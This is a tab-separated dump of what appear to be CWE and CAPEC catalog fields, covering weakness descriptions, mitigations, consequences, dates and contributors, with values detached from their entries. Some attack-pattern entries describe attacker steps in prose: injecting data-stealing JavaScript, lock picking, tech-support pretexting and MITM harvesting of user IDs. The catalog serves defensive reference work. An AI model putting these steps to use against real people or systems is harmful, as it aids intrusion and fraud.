8364	63	Read Files or Directories
17950	56	ChildOf
16764	89	Meta
12963	45	Variant
6538	103	Primary
6848	79	Confidentiality
9859	28	CWE Content Team
19311	23	The software uses external input to dynamically construct an XQuery expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.
13037	71	2010
21851	103	Primary
22974	62	updated Potential_Mitigations
18670	26	Implementation
8499	28	CWE Content Team
18146	72	If the incorrect calculation leads to an insufficient comparison (CWE-697), it may compromise a protection mechanism such as a validation routine and allow an attacker to bypass the security-critical code.
19299	40	Recipient is using signature verification software that does not maintain separation between signed and unsigned data once the signature has been verified.
6231	35	MITRE
17883	81	Integrity
21079	88	Incorrect Calculation of Multi-Byte String Length
15027	50	Implement system antivirus software that scans all attachments before opening them.
9291	62	updated Description, Name
24959	43	Simple
18721	39	2009-03-10
8586	39	2017-11-08
15092	62	updated Relationships, Taxonomy_Mappings
7667	35	MITRE
9562	77	Automated Static Analysis - Binary or Bytecode
12747	47	Read Data
7053	67	High
5611	31	699
22334	85	493
13739	39	2009-10-29
21497	39	2017-11-08
17827	81	Availability
6421	39	2008-07-01
17302	79	Integrity
22073	39	2011-06-01
11215	100	The MITRE Corporation
22666	35	Cigital
10365	28	CWE Content Team
25051	62	updated Relationships
16530	21	CWE Content Team
10690	23	The J2EE application stores a plaintext password in a configuration file.
12791	28	CWE Content Team
11433	23	The code does not function according to its published specifications, potentially leading to incorrect usage.
16543	45	Base
25171	55	CAPEC Content Team
12808	39	2008-07-01
12061	35	MITRE
25237	28	CWE Content Team
9662	97	Cellular Traffic Intercept
10480	62	updated Relationships
13617	62	updated Relationships
18066	69	Draft
16934	49	2019
24691	35	MITRE
23854	28	Eric Dalci
22252	56	ChildOf
11483	35	MITRE
25065	35	MITRE
15753	35	MITRE
15336	103	Primary
20177	50	There are tools such as Sharefuzz [R.10.3] which is an environment variable fuzzer for Unix that support loading a shared library. You can use Sharefuzz to determine if you are exposing an environment variable vulnerable to buffer overflow.
7869	62	updated Applicable_Platforms, Enabling_Factors_for_Exploitation, Modes_of_Introduction
18634	39	2012-05-11
16787	21	7 Pernicious Kingdoms
14485	55	CAPEC Content Team
16097	86	http://cr.yp.to/docs/resources.html
9725	101	CAPEC Content Team
13994	62	added/updated white box definitions
7432	53	The MITRE Corporation
22632	35	MITRE
23995	28	Eric Dalci
10026	27	Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.
23402	63	Modify Application Data
23603	35	MITRE
11817	28	CWE Content Team
25359	56	ChildOf
12174	62	updated Applicable_Platforms
7040	103	Primary
14107	104	282
10661	28	CWE Content Team
18604	62	updated Relationships
23322	92	Explore
25219	72	The state variables may contain sensitive information that should not be known by the client.
9804	74	1
21359	91	Implementation
18272	62	updated Potential_Mitigations
21901	39	2012-10-30
10309	86	http://seclists.org/bugtraq/2005/Feb/309
24251	28	CWE Content Team
10953	35	MITRE
19495	28	CWE Content Team
10770	28	CWE Content Team
9585	33	John Viega
20319	35	MITRE
22906	72	At a minimum, an attacker who retrieves this file would have all the information contained in it, whether that be database calls, the format of parameters accepted by the application, or simply information regarding the architectural structure of your site.
10617	78	High
11898	39	2012-05-11
21058	42	If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the hostname.
12994	39	2009-05-27
14326	81	Availability
20381	40	Mail server vendor has not released a patch for the MIME conversion routine, the patch itself has a security hole or does not fix the original problem, or the patch has not been applied to the user's system.
23834	28	Eric Dalci
14936	46	While logging is a good practice in general, and very high levels of logging are appropriate for debugging stages of development, too much logging in a production environment might hinder a system administrator's ability to detect anomalous conditions. This can provide cover for an attacker while attempting to penetrate a system, clutter the audit trail for forensic analysis, or make it more difficult to debug problems in a production environment.
10522	39	2019-01-03
9584	28	CWE Content Team
6427	35	MITRE
24784	100	The MITRE Corporation
8134	35	MITRE
24917	30	Weidong Shao
12851	23	Obscuring a password with a trivial encoding does not protect the password.
7297	91	Implementation
6858	72	Incorrect pointer scaling will often result in buffer overflow conditions. Confidentiality can be compromised if the weakness is in the context of a buffer over-read or under-read.
10551	69	Incomplete
18363	92	Exploit
13877	39	2017-11-08
25123	27	None: No specialized resources are required to execute this type of attack.
14954	62	updated Description, Potential_Mitigations
19098	76	2019-04-04
7997	100	The MITRE Corporation
15571	39	2010-02-16
20696	39	2014-07-30
10878	79	Availability
20310	62	updated Taxonomy_Mappings
12879	100	The MITRE Corporation
16561	23	The software does not correctly convert an object, resource, or structure from one type to a different type.
5786	63	Read Application Data
13378	26	Implementation
22974	35	MITRE
23854	39	2008-07-01
7124	103	Primary
6667	24	MITRE
24877	32	FireEye
7706	59	Updated Resources_Required
7583	104	176
11756	39	2010-12-13
17620	35	MITRE
18263	39	2017-01-19
24602	90	Language-Independent
17964	72	Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash.
11513	21	PLOVER
22206	28	CWE Content Team
14596	62	updated Relationships, Taxonomy_Mappings
12556	62	updated Common_Consequences, Relationships
11746	100	The MITRE Corporation
9483	81	Access Control
11037	35	MITRE
7481	101	CAPEC Content Team
22085	28	KDM Analytics
13245	23	An adversary hosts an event within an application framework and then monitors the data exchanged during the course of the event for the purpose of harvesting any important data leaked during the transactions. One example could be harvesting lists of usernames or userIDs for the purpose of sending spam messages to those users. One example of this type of attack involves the adversary creating an event within the sub-application. Assume the adversary hosts a "virtual sale" of rare items. As other users enter the event, the attacker records via MITM proxy the user_ids and usernames of everyone who attends. The adversary would then be able to spam those users within the application using an automated script.
18682	28	CWE Content Team
9111	28	CWE Content Team
6434	76	2015-12-07
17988	39	2017-11-08
9550	39	2013-02-21
9587	28	CWE Content Team
24636	35	MITRE
24502	76	2017-08-04
15978	39	2017-11-08
11688	50	Ensure that application handles situations where access to APIs in external libraries is not available securely. If the application cannot continue its execution safely it should fail in a consistent and secure fashion.
16535	59	Updated @Abstraction
13086	53	The MITRE Corporation
15373	62	updated Applicable_Platforms, Functional_Areas, Modes_of_Introduction, Relationships
8394	35	MITRE
7389	100	The MITRE Corporation
7408	39	2012-05-11
24454	61	Draft
14311	100	The MITRE Corporation
13051	32	W3C
13939	88	Improper Control of Interaction Frequency
17715	56	ChildOf
20392	35	MITRE
23191	73	Spidering web sites for all available links
21519	26	Operation
12855	69	Draft
21299	86	http://cwe.mitre.org/documents/sources/ATaxonomyofSecurityFaultsintheUNIXOperatingSystem%5BAslam95%5D.pdf
8111	35	MITRE
13589	35	MITRE
19959	39	2019-06-20
13580	35	MITRE
17473	39	2009-01-12
6674	28	Eric Dalci
19295	39	2010-09-27
20617	62	updated Background_Details, Modes_of_Introduction, Potential_Mitigations, Relationships
14893	23	The software constructs all or part of an expression language (EL) statement in a Java Server Page (JSP) using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended EL statement before it is executed.
17205	28	CWE Content Team
24475	35	MITRE
24991	76	2018-07-31
18112	28	CWE Content Team
23934	50	Ensure proper permissions are in place to prevent adversaries from altering the execution status of security tools.
12727	86	http://www.diovo.com/2008/09/sanitizing-user-data-how-and-where-to-do-it/
15653	97	Leverage Executable Code in Non-Executable Files
7831	28	CWE Content Team
23109	91	Operation
15273	35	MITRE
22702	39	2014-07-30
19114	28	CWE Content Team
19757	35	MITRE
20334	62	updated Description, Other_Notes
22141	39	2012-05-11
7519	35	MITRE
10180	91	Architecture and Design
10107	62	updated Related_Attack_Patterns, Relationships
10470	62	updated Description, Other_Notes
24455	62	updated Potential_Mitigations
5861	40	The attacker must have the ability to place himself in the communication path between the client and server.
25347	30	Thai Duong
11189	28	CWE Content Team
22981	101	CAPEC Content Team
8648	56	ChildOf
11453	63	Alter Execution Logic
10801	43	Simple
24184	35	MITRE
8763	31	699
12339	23	The accidental deletion of a data-structure sentinel can cause serious programming logic problems.
6861	42	Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.
24810	56	ChildOf
17637	42	Consider modifying your code to use non-blocking synchronization methods.
23147	35	MITRE
21547	28	CWE Content Team
21561	66	PaX
16150	63	Bypass Protection Mechanism
17788	53	The MITRE Corporation
21367	39	2008-09-08
8670	35	MITRE
20680	100	The MITRE Corporation
7713	45	Base
9796	81	Other
10198	73	The attacker loads the predefined or predicted session ID into his software and utilizes functionality with the rights of the victim.
13204	72	A stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.
6284	50	Avoid sensitive information, such as usernames or authentication and authorization information, in user-controllable locations.
14173	91	Implementation
8008	91	Implementation
6462	39	2011-06-27
22419	25	Medium
18922	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
14705	62	updated Relationships, Taxonomy_Mappings
13957	62	updated Description, Name
20924	28	CWE Content Team
12065	90	Language-Independent
11356	62	updated Other_Notes
22432	39	2014-07-30
7212	91	Implementation
20286	62	updated Common_Consequences, Demonstrative_Examples, References, Relationships
23500	28	CWE Content Team
24416	39	2014-07-30
20544	100	The MITRE Corporation
19164	35	MITRE
13576	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
24265	77	Fuzzing
6202	44	SOAR Partial
8797	39	2008-09-08
11936	28	CWE Content Team
25372	63	Execute Unauthorized Code or Commands
17355	104	145
7252	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
9283	35	MITRE
10720	62	updated Applicable_Platforms
22241	62	updated Description, Name
6728	62	updated Other_Notes
19664	21	PLOVER
22831	76	2017-05-01
12770	79	Confidentiality
25266	62	updated Relationships
11460	28	CWE Content Team
21773	28	CWE Content Team
16050	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
8080	28	CWE Content Team
14343	96	2010-11-08
21886	39	2012-05-11
10132	100	The MITRE Corporation
15054	28	CWE Content Team
13413	39	2019-06-20
13985	35	MITRE
8685	26	Architecture and Design
14492	63	Modify Application Data
11777	67	High
19627	31	699
17235	28	Eric Dalci
15840	23	An attacker uses lock picking tools and techniques to bypass the locks on a building or facility. Lock picking is the use of a special set of tools to manipulate the pins within a lock. Different sets of tools are required for each type of lock. Lock picking attacks have the advantage of being non-invasive in that if performed correctly the lock will not be damaged. A standard lock pin-and-tumbler lock is secured by a set of internal pins that prevent the tumbler device from turning. Spring loaded driver pins push down on the key pins preventing rotation so that the bolt remains in a locked position.. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. Most common locks, such as domestic locks in the US, can be picked using a standard 2 tools (i.e. a torsion wrench and a hook pick).
15310	91	Implementation
9023	103	Primary
17790	45	Class
21215	91	Implementation
16794	91	System Configuration
11807	81	Other
11995	56	ChildOf
9640	90	C++
6102	63	Alter Execution Logic
11278	79	Confidentiality
17892	35	MITRE
9117	91	Build and Compilation
24554	35	MITRE
24059	51	2014-06-23
24642	66	Cross-Site Request Forgeries: Exploitation and Prevention
23629	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
7417	62	updated Applicable_Platforms, Common_Consequences, Description
20495	35	MITRE
6662	56	ChildOf
8066	92	Experiment
19626	103	Primary
12360	57	Resultant
24527	28	CWE Content Team
6204	81	Integrity
6245	91	Implementation
15902	23	An adversary, through a previously installed malicious application, issues an intent directed toward a specific trusted application's component in an attempt to achieve a variety of different objectives including modification of data, information disclosure, and data injection. Components that have been unintentionally exported and made public are subject to this type of an attack. If the component blindly trusts the intent's action, then the target application performs the functionality at the adversary's request, helping the adversary achieve the desired negative technical impact.
25431	26	Architecture and Design
22926	35	MITRE
13555	59	Updated Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact
7519	39	2014-07-30
22537	28	CWE Content Team
13519	89	Standard
13517	102	PeerOf
8664	42	When locking and unlocking a resource, try to be sure that all control paths through the code in which the resource is locked one or more times correspond to exactly as many unlocks. If the software acquires a lock and then determines it is not able to perform its intended behavior, be sure to release the lock(s) before waiting for conditions to improve. Reacquire the lock(s) before trying again.
8011	25	Medium
24718	23	An adversary engages in pretexting behavior, assuming the role of a tech support worker, to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. An adversary who uses social engineering to impersonate a tech support worker can have devastating effects on a network. This is an effective attack vector, because it can give an adversary physical access to network computers. It only takes a matter of seconds for someone to compromise a computer with physical access. One of the best technological tools at the disposal of a social engineer, posing as a technical support person, is a USB thumb drive. These are small, easy to conceal, and can be loaded with different payloads depending on what task needs to be done. However, this form of attack does not require physical access as it can also be effectively carried out via phone or email.
8286	91	System Configuration
20381	23	An attacker exploits a weakness in the MIME conversion routine to cause a buffer overflow and gain control over the mail server machine. The MIME system is designed to allow various different information formats to be interpreted and sent via e-mail. Attack points exist when data are converted to MIME compatible format and back.
25273	46	This issue can prevent the software from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.    As examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.
15775	90	C
12901	81	Confidentiality
6253	63	Modify Memory
22058	39	2009-05-27
7334	81	Integrity
24713	62	updated Relationships
22584	81	Integrity
19111	39	2011-03-29
16424	39	2008-09-08
10519	35	MITRE
16667	39	2008-07-01
16357	56	ChildOf
11985	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.
12312	35	Cigital
6673	44	High
25418	39	2011-03-29
6813	23	The software uses a function, library, or third party component       that has been explicitly prohibited, whether by the developer or       the customer.
8232	28	CWE Content Team
8354	39	2010-02-16
19567	26	Implementation
21503	31	1000
24422	62	updated Potential_Mitigations
11044	57	Resultant
14963	62	updated Relationships
23739	28	CWE Content Team
24330	100	The MITRE Corporation
14036	91	Implementation
8928	61	Draft
15975	62	updated Relationships
15444	44	SOAR Partial
24437	63	DoS: Instability
10844	62	updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings
11665	62	updated Relationships
8420	79	Confidentiality
7822	39	2014-06-23
6023	36	http://projects.webappsec.org/Format-String
15254	39	2017-11-08
15100	39	2017-11-08
8080	39	2014-07-30
9751	28	CWE Content Team
19498	62	updated Common_Consequences
16964	35	MITRE
6761	35	MITRE
23622	90	Java
25209	62	updated Demonstrative_Examples
10192	39	2009-12-28
10970	28	CWE Content Team
21705	101	CAPEC Content Team
18188	79	Confidentiality
23814	39	2014-07-30
17178	28	CWE Content Team
14794	27	None: No specialized resources are required to execute this type of attack.
22195	88	Unchecked Return Value to NULL Pointer Dereference
18788	40	This attack requires the ability to conduct deep packet inspection with an In-Path device that can drop the targeted traffic and/or connection.
17102	62	updated Time_of_Introduction
24557	39	2009-12-28
6415	31	1000
7289	96	2018-03-12
22173	62	updated Applicable_Platforms, Likelihood_of_Exploit, Time_of_Introduction
11667	21	PLOVER
24501	39	2019-01-03
24447	90	Language-Independent
20891	43	Simple
17756	27	Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges.                A tool capable of sending and receiving packets from a remote system.
17406	39	2008-09-08
12289	61	Draft
17436	35	MITRE
15836	86	https://baesystemsai.blogspot.com/2013/11/security-issues-with-using-phps.html
24812	26	Implementation
17586	88	Improper Neutralization of Script in Attributes of IMG Tags in a Web Page
13991	39	2014-07-30
18344	28	Eric Dalci
10228	104	352
13428	39	2010-06-21
10985	35	MITRE
21115	77	Automated Static Analysis - Binary or Bytecode
7357	35	MITRE
11323	35	MITRE
7634	36	https://www.schneier.com/crypto-gram/archives/2000/0715.html
21514	28	CWE Content Team
20570	39	2008-07-01
6192	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
6975	71	2012
20634	35	Cigital
12652	39	2010-02-16
21945	35	MITRE
9753	91	Architecture and Design
13773	39	2013-02-21
10629	103	Primary
7211	91	Architecture and Design
11875	28	CWE Content Team
12333	35	MITRE
18425	56	ChildOf
23329	42	Use an alist which checks the uniqueness of hash keys with each entry before inserting the entry.
14429	47	Bypass Protection Mechanism
8659	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Configuration Checker
8824	35	MITRE
13376	79	Access Control
6886	32	http://www.shmoo.com/idn/homograph.txt
11348	40	The target host does not perform correct boundary checking while consuming data from a resources.
8840	39	2014-06-23
24957	23	The application has a form field that is not validated by a corresponding validation form, which can introduce other weaknesses related to insufficient input validation.
25305	63	Read Application Data
24926	102	ChildOf
18551	28	CWE Content Team
21846	39	2008-07-01
16973	97	TCP RPC Scan
16186	62	updated Relationships
18641	28	CWE Content Team
10542	63	Other
15243	33	Jeremiah Grossman
10121	23	Attacks on session IDs and resource IDs take advantage of the fact that some software accepts user input without verifying its authenticity. For example, a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or indeed the process that wrote the message to the queue are authentic and authorized to do so. Many server side processes are vulnerable to these attacks because the server to server communications have not been analyzed from a security perspective or the processes "trust" other systems because they are behind a firewall. In a similar way servers that use easy to guess or spoofable schemes for representing digital identity can also be vulnerable. Such systems frequently use schemes without cryptography and digital signatures (or with broken cryptography). Session IDs may be guessed due to insufficient randomness, poor protection (passed in the clear), lack of integrity (unsigned), or improperly correlation with access control policy enforcement points. Exposed configuration and properties files that contain system passwords, database connection strings, and such may also give an attacker an edge to identify these identifiers. The net result is that spoofing and impersonation is possible leading to an attacker's ability to break authentication, authorization, and audit controls on the system.
16993	28	CWE Content Team
6772	26	Architecture and Design
18462	35	Cigital
23177	74	4
9290	62	updated Relationships
13642	21	CWE Content Team
19671	56	ChildOf
23984	62	updated Relationships, Other_Notes, Taxonomy_Mappings
22025	39	2008-10-14
20287	103	Primary
14095	28	CWE Content Team
5821	73	Use a browser to manually explore the website and analyze how the application processes XML requests.
18582	74	2
25128	46	The information either:                                                is regarded as sensitive within the product's own functionality, such as a private message; or                   provides information about the product or its environment that could be useful in an attack but is normally not available to the attacker, such as the installation path of a product that is remotely accessible.                                          Many information exposures are resultant (e.g. PHP script error revealing the full path of the program), but they can also be primary (e.g. timing discrepancies in cryptography). There are many different types of problems that involve information exposures. Their severity can range widely depending on the type of information that is revealed.
9574	23	If no mechanism is in place for managing password aging, users will have no incentive to update passwords in a timely manner.
13605	35	MITRE
10330	51	2018-05-04
14270	43	Simple
20005	35	MITRE
6308	28	CWE Content Team
19825	39	2011-03-29
23249	46	In situations where data should not be tied to individual users, but a large number of users should be able to make queries that "scrub" the identity of users, it may be possible to get information about a user -- e.g., by specifying search terms that are known to be unique to that user.
6707	59	Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Typical_Likelihood_of_Exploit
14676	62	updated Relationships, Taxonomy_Mappings
8636	61	Stable
12171	28	CWE Content Team
22161	50	Authenticate all servers and perform redundant checks when using DNS hostnames.
15759	56	CanPrecede
7835	62	updated Applicable_Platforms, Relationships
12957	39	2009-03-10
16867	91	Architecture and Design
7154	28	CWE Content Team
12628	88	Improper Adherence to Coding Standards
10585	28	CWE Content Team
23833	63	Bypass Protection Mechanism
21859	43	Simple
11157	39	2010-09-27
20452	39	2008-09-08
6636	33	Frank Kim
21036	35	MITRE
19087	56	ChildOf
18330	28	CWE Content Team
9154	28	CWE Content Team
11134	43	Simple
13936	63	Read Application Data
12896	44	High
8698	28	CWE Content Team
21964	49	1995
24472	39	2017-11-08
15552	62	updated Relationships, Relevant_Properties
15817	35	Cigital
10228	87	Web Server
19357	44	Moderate
7523	21	CWE Content Team
7306	43	Simple
20609	104	206
9491	35	MITRE
10887	62	updated Relationships
23127	39	2008-10-14
20233	28	CWE Content Team
24470	21	7 Pernicious Kingdoms
8051	40	Web server software must rely on file name or file extension for processing.
18683	86	http://blogs.sans.org/appsecstreetfighter/2009/12/28/8-basic-rules-to-implement-secure-file-uploads/
9069	62	updated Relationships
19116	101	CAPEC Content Team
24903	39	2012-10-30
6284	89	Meta
19622	21	CWE Content Team
20618	61	Draft
17118	102	ChildOf
12794	35	MITRE
5639	39	2011-06-01
7610	39	2008-10-14
19907	35	MITRE
13385	35	MITRE
18346	53	The MITRE Corporation
10018	63	Alter Execution Logic
12758	90	Language-Independent
16298	39	2009-07-27
11784	62	updated Relationships
22403	40	A framework-based language that supports code signing and sandbox (such as Java, .Net, JavaScript, and Flash) Deployed code that has been signed by its authoring vendor, or a partner
12500	79	Confidentiality
7897	100	The MITRE Corporation
19418	51	2014-06-23
18325	100	The MITRE Corporation
14387	23	The software writes data past the end, or before the beginning, of the intended buffer.
8451	54	Medium
24755	62	updated Relationships, Taxonomy_Mappings, Type
6604	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
12264	28	CWE Content Team
6171	59	Updated Related_Weaknesses
12060	28	CWE Content Team
22982	103	Primary
7415	91	Architecture and Design
8081	39	2011-06-01
24819	28	CWE Content Team
12811	54	High
23051	62	updated Relationships, Taxonomy_Mappings
21729	102	ChildOf
17553	28	CWE Content Team
23934	40	The adversary must have the capability to interact with the configuration of the targeted system.
9223	31	1000
7572	48	12
19591	28	CWE Content Team
16753	97	LDAP Injection
19817	28	CWE Content Team
7547	63	Execute Unauthorized Code or Commands
6569	59	Updated Attack_Motivation-Consequences
10308	69	Incomplete
23936	63	Gain Privileges or Assume Identity
6961	31	700
19992	39	2012-10-30
22819	91	Implementation
25010	51	2015-11-09
20008	28	CWE Content Team
24062	39	2017-11-08
23066	27	The adversary must have the necessary technology to intercept information passing between the nodes of a network. For TCP/IP, the capability to run tcpdump, ethereal, etc. can be useful. Depending upon the data being targeted the technological requirements will change.
23047	39	2011-06-01
18511	97	Malicious Logic Insertion
15622	39	2008-09-08
18507	23	This attack uses a maliciously-crafted HTTP request in order to cause a vulnerable web server to respond with an HTTP response stream that will be interpreted by the client as two separate responses instead of one. This is possible when user-controlled input is used unvalidated as part of the response headers. The target software, the client, will interpret the injected header as being a response to a second request, thereby causing the maliciously-crafted contents be displayed and possibly cached.
14522	39	2009-07-27
20551	62	updated Common_Consequences
14103	42	When invoking other programs, specify those programs using fully-qualified pathnames. While this is an effective approach, code that uses fully-qualified pathnames might not be portable to other systems that do not use the same pathnames. The portability can be improved by locating the full-qualified paths in a centralized, easily-modifiable location within the source code, and having the code refer to these paths.
8526	104	1099
7547	81	Confidentiality
19339	39	2018-03-27
13615	31	1000
22164	39	2017-11-08
8676	33	HD Moore
21213	67	High
11003	51	2015-11-09
20271	35	MITRE
21593	39	2017-11-08
14883	62	updated Time_of_Introduction
14052	88	Information Loss or Omission
5817	103	Primary
14404	48	11
19431	56	ChildOf
15949	97	Malicious Software Update
24646	25	High
19782	103	Primary
24856	79	Confidentiality
22370	62	updated Relationships
19919	28	CWE Content Team
11439	28	CWE Content Team
25181	62	updated Description, Name, Type
7820	45	Base
23290	62	updated Relationships
23720	79	Integrity
24929	70	OWASP
8524	53	The MITRE Corporation
25387	50	Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.
23021	69	Incomplete
20569	89	Detailed
25287	35	MITRE
17412	24	Cigital
13488	28	CWE Content Team
23677	28	CWE Content Team
5956	35	MITRE
16966	31	699
20445	62	updated Demonstrative_Example, Time_of_Introduction
6007	50	Limit the usage of formatting string functions.
16114	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
16687	39	2011-03-29
24462	72	If system administrators are unable to effectively process log files, attempted attacks may go undetected, possibly leading to eventual system compromise.
13565	69	Incomplete
24174	62	updated Applicable_Platforms
16896	31	1000
21382	63	Read Application Data
25362	62	updated Applicable_Platforms, Taxonomy_Mappings
22674	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
15930	57	Primary
15574	62	updated Applicable_Platforms, Description, Detection_Factors, Relationships, Other_Notes
8939	63	Read Application Data
20618	50	Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should be rejected by the program.
17432	88	Heap-based Buffer Overflow
18646	28	CWE Content Team
9517	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
22413	55	CAPEC Content Team
23442	35	MITRE
19937	89	Detailed
19125	103	Primary
20941	39	2010-02-16
24798	104	827
22574	28	CWE Content Team
7405	43	Simple
14602	44	High
24904	63	Modify Files or Directories
24771	53	The MITRE Corporation
17401	23	An adversary crafts a request to a target that results in the target listing/indexing the content of a directory as output. One common method of triggering directory contents as output is to construct a request containing a path that terminates in a directory name rather than a file name since many applications are configured to provide a list of the directory's contents when such a request is received. An adversary can use this to explore the directory tree on a target as well as learn the names of files. This can often end up revealing test files, backup files, temporary files, hidden files, configuration files, user accounts, script contents, as well as naming conventions, all of which can be used by an attacker to mount additional attacks.
16914	35	MITRE
15186	39	2014-07-30
15217	91	Architecture and Design
20902	35	MITRE
20708	35	MITRE
9194	35	MITRE
11479	69	Incomplete
18079	79	Confidentiality
7637	47	Other
21528	28	CWE Content Team
6458	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
14897	39	2008-11-24
24457	45	Base
11953	39	2014-02-18
14442	31	1000
8470	72	An attacker may be able to execute code.
14682	28	CWE Content Team
21221	95	[Modify parameter/token values] Trying each parameter in turn, the attacker modifies the values
23873	81	Integrity
23509	35	MITRE
12160	54	Low
21213	43	Simple
25154	91	Implementation
7877	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
23134	47	Execute Unauthorized Commands
10193	50	Implementation: The victim should configure the browser to minimize active content from untrusted sources.
16358	26	Implementation
17055	46	This might allow attackers to execute their own programs, access unauthorized data files, or modify configuration in unexpected ways. If the application uses a search path to locate critical resources such as programs, then an attacker could modify that search path to point to a malicious program, which the targeted application would then execute. The problem extends to any type of critical resource that the application trusts.             Some of the most common variants of untrusted search path are:                                                In various UNIX and Linux-based systems, the PATH environment variable may be consulted to locate executable programs, and LD_PRELOAD may be used to locate a separate library.                   In various Microsoft-based systems, the PATH environment variable is consulted to locate a DLL, if the DLL is not found in other paths that appear earlier in the search order.
14696	91	Operation
23499	62	updated Potential_Mitigations
5837	102	ChildOf
25106	28	CWE Content Team
14626	28	CWE Content Team
14905	35	MITRE
11172	50	Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.
9766	56	ChildOf
20610	76	2018-07-31
21919	62	updated Relationships
22073	35	MITRE
12720	69	Incomplete
12655	62	updated Other_Notes, Relationship_Notes
25158	28	CWE Content Team
22975	44	High
19507	62	updated Relationships
8334	26	Implementation
25311	91	Architecture and Design
21963	81	Confidentiality
16838	86	http://www.cap-lore.com/CapTheory/ConfusedDeputy.html
6876	89	Detailed
18977	52	To find the issue in the implementation, manual checks or automated static analysis could be applied to the XML configuration files.
12074	101	CAPEC Content Team
22102	81	Integrity
10310	28	CWE Content Team
16545	28	CWE Content Team
5892	28	Eric Dalci
21646	88	Critical Public Variable Without Final Modifier
11041	90	Java
14206	43	Simple
14925	28	CWE Content Team
9209	23	The application uses a signal handler that shares state with other signal handlers, but it does not properly mask or prevent those signal handlers from being invoked while the original signal handler is still running.
14827	35	MITRE
12443	95	The attacker modifies a tag or variable from a formatted configuration data. For instance she changes it to an oversized string.
10728	35	MITRE
21380	39	2019-01-03
17221	92	Explore
11198	62	updated Applicable_Platforms, Relationships, Other_Notes
11081	80	Ability to create a malicious library.
20988	35	MITRE
6733	76	2017-01-09
7229	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
13463	59	Updated Examples-Instances, References
12924	56	ChildOf
6937	28	CWE Content Team
18978	102	ChildOf
20778	56	ChildOf
9297	57	Primary
15792	62	updated Potential_Mitigations, Time_of_Introduction
21403	91	Implementation
17741	39	2008-07-01
20959	100	The MITRE Corporation
7343	35	MITRE
14203	35	MITRE
9214	62	updated Maintenance_Notes, Other_Notes
9488	76	2019-04-04
14158	31	1000
14079	62	updated Applicable_Platforms, Likelihood_of_Exploit
12877	35	Cigital
11717	74	3
13668	35	Cigital
6886	30	Eric Johanson
16946	100	The MITRE Corporation
18425	103	Primary
23402	81	Integrity
13612	74	1
23477	39	2012-05-11
20182	103	Primary
6172	91	Operation
8849	39	2008-10-14
10925	72	By modifying state variables, the attacker could violate the application's expectations for the contents of the state, leading to a denial of service due to an unexpected error condition.
11050	35	MITRE
24602	45	Base
16172	60	16
19210	62	updated Description
23881	23	The software does not neutralize or incorrectly neutralizes output that is written to logs.
17992	91	Operation
7431	88	Use of Hard-coded Password
13372	62	updated Demonstrative_Examples, Observed_Examples, References, Relationships
17191	80	Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.
13528	28	CWE Content Team
7246	39	2014-07-30
20290	81	Integrity
19663	81	Availability
6268	59	Updated References
20701	28	CWE Content Team
20757	39	2010-09-27
9795	81	Integrity
24532	95	[Execute malicious commands] Using one or more vulnerable TTY, execute commands to achieve various impacts.
7334	63	Read Files or Directories
5935	76	2015-11-09
16367	23	A protection mechanism relies exclusively, or to a large extent, on the evaluation of a single condition or the integrity of a single object or entity in order to make a decision about granting access to restricted resources or functionality.
19395	88	Incorrect Implementation of Authentication Algorithm
24475	62	updated Taxonomy_Mappings
